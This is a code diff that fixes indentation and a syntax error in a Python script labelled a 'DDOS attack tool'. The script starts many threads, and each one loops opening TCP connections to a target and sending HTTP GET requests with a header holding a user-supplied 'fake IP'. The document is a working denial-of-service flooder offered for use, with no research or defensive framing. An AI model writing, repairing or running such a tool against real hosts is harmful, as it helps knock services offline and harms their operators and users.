@@ -3,16 +3,17 @@ import threading
 import argparse
 
 def attack(target, fake_ip, port):
-    while True:
-      try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-        s.close()
-      except socket.error as e:
-        print(f"Error: {e}")
-	break
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((target, port))
+			s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+			s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+			s.close()
+
+		except socket.error as e:
+			print(f"Error: {e}")
+			break
 
 def start_attack(target, fake_ip, port, threads):
 	for i in range(threads):
@@ -20,7 +21,7 @@ def start_attack(target, fake_ip, port, threads):
 		thread.start()
 
 if __name__ == '__main__':
-	parser=argparse.ArgumentParser(description=DDOS attack tool)
+	parser=argparse.ArgumentParser(description='DDOS attack tool')
 	parser.add_argument('target', type=str, help='Target IP or Domain')
 	parser.add_argument('fake_ip', type=str, help='Fake IP to use')
 	parser.add_argument('port', type=int, help='Port number')
